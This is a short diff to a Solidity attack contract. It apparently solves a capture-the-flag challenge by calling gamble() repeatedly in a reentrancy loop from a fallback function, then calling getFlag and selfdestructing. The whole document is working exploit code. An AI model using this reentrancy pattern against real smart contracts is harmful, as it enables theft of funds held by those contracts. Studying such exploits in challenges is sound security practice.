@@ -17,7 +17,7 @@ contract EnterAgain {
         uint b = block.number;
         require((b).mod(7) == 0, "wrong block number");
         Entrance entrance = Entrance(a);
-        entrance.enter(0xbc4f77);
+        entrance.enter(1);
         entrance.gamble();
         entrance.getFlag("151.217.239.78", "6656");
     }
@@ -25,8 +25,10 @@ contract EnterAgain {
     function() {
         Entrance entrance = Entrance(a);
         counter++;
-        if(counter < 3) {
-            entrance.gamble();
+        if(counter < 40) {
+            a.call(bytes4(sha3("gamble()")));
+        } else {
+            selfdestruct(0x0); 
         }
     }
 }
